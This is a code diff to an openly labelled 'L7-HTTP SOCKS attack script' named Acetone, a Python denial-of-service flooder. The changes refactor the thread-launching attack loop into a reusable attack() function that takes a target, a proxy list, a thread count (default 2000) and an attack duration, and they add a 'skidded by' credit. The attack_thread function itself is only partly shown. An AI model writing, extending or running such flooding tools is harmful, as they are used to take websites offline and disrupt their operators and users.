@@ -7,7 +7,7 @@ init(convert = True)
 banner = f"""{f.RED}
 ╔═╗┌─┐┌─┐┌┬┐┌─┐┌┐┌┌─┐
 ╠═╣│  ├┤  │ │ ││││├┤ 
-╩ ╩└─┘└─┘ ┴ └─┘┘└┘└─┘ (CH3)2CO L7-HTTP Method
+╩ ╩└─┘└─┘ ┴ └─┘┘└┘└─┘ (CH3)2CO L7-HTTP Method | Skidded by khoi1908vn
 {f.RESET}"""
 class quotes:
     PleaseEnterTheCorrectOption = '[!] Please enter the correct option'
@@ -119,7 +119,7 @@ def ProxiesOptions(proxy_type: int):
     if proxiescount == 0: closeProgram(quotes.NoProxyDetected)
     # print(f'Available proxies: {proxiescount} SOCKS{str(proxy_type)}')
     print(quotes.AvailableProxies + str(proxiescount) + ' ' + f'SOCKS{proxy_type}')
-    return proxies, proxiescount
+    return proxies
 
 def signature(lines = '------------------------------------------------------------------------------------------------------------------------', quote = 'A fully-skidded L7-HTTP SOCKS attack script written in Python 3 using PySocks <import socks | pip install PySocks>'):
     print(f.LIGHTRED_EX + lines)
@@ -220,8 +220,55 @@ def attack_thread(event: threading.Event, socks_type: int, target: str, port: in
             except: s.close()
         except: s.close()
 
-def attack(event: threading.Event, socks_type: int, target: str, port: int, protocol: str, path: str, proxies: list, cookies: str, multiple: int = 100, time: int = 0):
-    if __name__ != '__main__': print(); signature()
+class attack_quotes:
+    PressEnterToStart = '[?] Press enter to start...\n'
+    StartingInWaiting = '[>] Starting threads in waiting mode...'
+    WakingUp = '[>] Waking up threads...'
+    Started = '[>] Started the attack! Press Ctrl + C (SIG.TERM) anytime to stop the attack.'
+    MightLag = '[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats'
+    FinishedIn = '[~] Finished attack in'
+    Stopping = '[~] Stopping...'
+    FalsingEvent = '[~] Setting internal flag to False...'
+    TryingToClose = '[~] Set! Trying to close the program...'
+
+def attack(socks_type: int, target: str, port: int, protocol: str, path: str, cookies: str, proxies: list, thread_num: int, multiple: int = 100, attack_time: float = 120.0, atq: type = attack_quotes, event: threading.Event = threading.Event()):
+    """
+    This module is for attacking outside the script, 
+    you will need to manually split your url into protocol + target + path + port | ParseUrl(), e.g -> 'http' + 'example.com' + '/' + '80'
+    get your proxies into a list/array | ProxiesOption(). 
+    """
+    proxiescount = len(proxies)
+    if __name__ != '__main__': print('Importing Acetone...'); signature()
+    event.clear()
+    process_list = []
+    for _ in range(thread_num):
+        th = threading.Thread(target = attack_thread, args = (event, socks_type, target, port, protocol, multiple, path, proxies, cookies), daemon = True)
+        process_list.append(th)
+    input(atq.PressEnterToStart)
+    # press enter to start
+    print(atq.StartingInWaiting)
+    for i in process_list:
+        i.start() # make the thread wait
+    print(atq.WakingUp)
+    event.set() # start all threads
+    print(atq.Started)
+    print(atq.MightLag, end = '\n\n')
+    start = time.time()
+    while event.is_set() and (attack_time == 0 or time.time() - start <= attack_time):
+        try:
+            el = time.time() - start 
+            el = 1 if el == 0 else el
+            print(f'[~] Attacking {str(target)}:{str(port)} ({str(thread_num)}thrs {str(proxiescount)}prxs) | {round(el)}/{str(attack_time if attack_time != 0 else "inf")}s elapsed' + ('| Attack powered by your lovely CPU and Acetone' if __name__ != '__main__' else ''), end = '\r')
+            time.sleep(0.05)
+        except KeyboardInterrupt:
+            break
+    else: # this only happen when time is up, in inf mode the 'break' will not execute this (python while break else rule)
+        print(atq.FinishedIn + f'{str(attack_time)}s')
+    print(atq.Stopping, end= '                                                                      \n')
+    print(atq.FalsingEvent)
+    event.clear()
+    print(atq.TryingToClose)
+    
 
 
 
@@ -247,7 +294,7 @@ def main():
             thread_num = str(input(quotes.AskThreads)).strip()
             thread_num = 2000 if thread_num in ['0', ''] else int(thread_num)
         except ValueError: print(quotes.PleaseEnterANumber)
-    proxies, proxiescount = ProxiesOptions(socks_type)
+    proxies = ProxiesOptions(socks_type)
     attack_time = None
     while attack_time == None:
         try:
@@ -259,40 +306,10 @@ def main():
 
     # press enter to continue
     clearConsole()
-    print(quotes.AttackInfo + line_break + f'- Target: {target}' + line_break + f'- Threads: {thread_num}' + line_break + f'- Proxies {proxiescount} SOCKS{socks_type}' + line_break + f'- Time: {str(attack_time if attack_time != 0 else "<inf>")}s')
+    print(quotes.AttackInfo + line_break + f'- Target: {target}' + line_break + f'- Threads: {thread_num}' + line_break + f'- Proxies {str(len(proxies))} SOCKS{socks_type}' + line_break + f'- Time: {str(attack_time if attack_time != 0 else "<inf>")}s')
     print('\n')
-    # prepare
-    event = threading.Event()
-    event.clear()
-    # this can be split into a def to import in another process
-    process_list = []
-    for _ in range(thread_num):
-        th = threading.Thread(target = attack_thread, args = (event, socks_type, target, port, protocol, 100, path, proxies, cookies), daemon = True)
-        process_list.append(th)
-    input('[?] Press enter to start...\n')
-    # press enter to start
-    print('[>] Starting threads in waiting mode...')
-    for i in process_list:
-        i.start() # make the thread wait
-    print('[>] Waking up threads...')
-    event.set() # start all threads
-    print('[>] Started the attack! Press Ctrl + C (SIG.TERM) anytime to stop the attack.')
-    print('[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats', end = '\n\n')
-    start = time.time()
-    while event.is_set() and (attack_time == 0 or time.time() - start <= attack_time):
-        try:
-            el = time.time() - start 
-            el = 1 if el == 0 else el
-            print(f'[~] Attacking {str(target)}:{str(port)} ({str(thread_num)}thrs {str(proxiescount)}prxs) | {round(el)}/{str(attack_time if attack_time != 0 else "inf")}s elapsed', end = '\r')
-            time.sleep(0.05)
-        except KeyboardInterrupt:
-            break
-    else: # this only happen when time is up, in inf mode the 'break' will not execute this (python while break else rule)
-        print(f'[~] Finished attack in {str(attack_time)}s')
-    print('[~] Stopping...', end= '                                                                      \n')
-    print('[~] Setting internal flag to False...')
-    event.clear()
-    print('[~] Set! Trying to close the program...')
+    # attack(socks_type: int, target: str, port: int, protocol: str, path: str, cookies: str, proxies: list, thread_num: int, multiple: int = 100, attack_time: float = 120.0, atq: type = attack_quotes, event: threading.Event = threading.Event()):
+    attack(socks_type= socks_type, target= target, port= port, protocol= protocol, path= path, cookies= cookies, proxies= proxies, thread_num= thread_num, attack_time= attack_time)
     closeProgram()
     # for fun, this shit is unreachable
     for i in process_list:
